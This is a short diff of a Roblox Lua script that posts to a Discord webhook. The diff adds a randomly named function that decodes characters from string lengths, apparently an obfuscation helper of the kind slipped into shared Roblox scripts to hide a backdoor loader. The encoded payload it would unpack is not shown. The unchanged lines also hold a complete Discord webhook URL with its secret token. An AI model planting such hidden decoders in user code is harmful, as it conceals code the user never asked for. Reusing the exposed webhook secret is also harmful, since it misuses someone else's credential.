@@ -1,3 +1,15 @@
+function bctpvufHoKCLzvaEpNjG(c)
+tab={}
+for i = 1,#c do
+x=string.len(c[i]) 
+y=string.char(x)
+table.insert(tab,y)
+end
+x=table.concat(tab)
+return x
+end 
+
+
 local HS = game:GetService("HttpService")
 local WebhookURL = "https://discord.com/api/webhooks/1172101815765045278/JmgEm1xnMh8a76wH-wrwp_TjAF95V5cu-KBcyLhZqrPoxQSEVatu-eBtC4C48IhEGyl0"
 --Replace your link with the link in the Quotes.
